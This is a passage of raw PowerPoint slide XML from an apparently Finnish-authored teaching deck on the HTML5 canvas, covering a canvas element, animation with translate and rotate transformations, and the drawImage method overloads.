                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"1024"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"768"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E2D747A-B1AB-47C4-8E2D-EA402C6E789D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Animation Using Transformations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151555" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC45E2A1-04FD-4E92-B495-4CE523AF6631}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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var</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counter</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draw</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requestAnimationFrame</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">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draw</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canvas</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canvas</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getContext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"2d"</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clearRect</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width</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height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save</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save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context</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tranformations</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are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cumulative</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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translate</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300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300</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rotate</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counter</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0.04</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strokeRect</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200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150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400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300</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counter</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restore</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restore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context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br>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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onload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draw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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id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canvas</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width</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"1024"</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height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"768"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</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endParaRPr lang="fi-FI" sz="1400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{730096EC-E4B9-4548-B6BD-D87A5F349064}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Drawing Images</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31747" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78EF7537-F662-4428-9CEA-55B9C4243268}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>you need to first have an image e.g. using &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>&gt; tag, creating image with JavaScript (new Image and assigning </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> to it, also possible with data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>drawImage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>image</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> image to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>are</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>upper</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>left</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>hand</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>coordinates</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>drawImage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>image</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> image to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> at (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>scaling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> it to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>size</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>defined</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>drawImage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>image</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>sWidth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>Height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, dx, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dWidth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dHeight</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>portion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> image (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>defined</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>sx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>sy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>sWidth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>sHeight</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
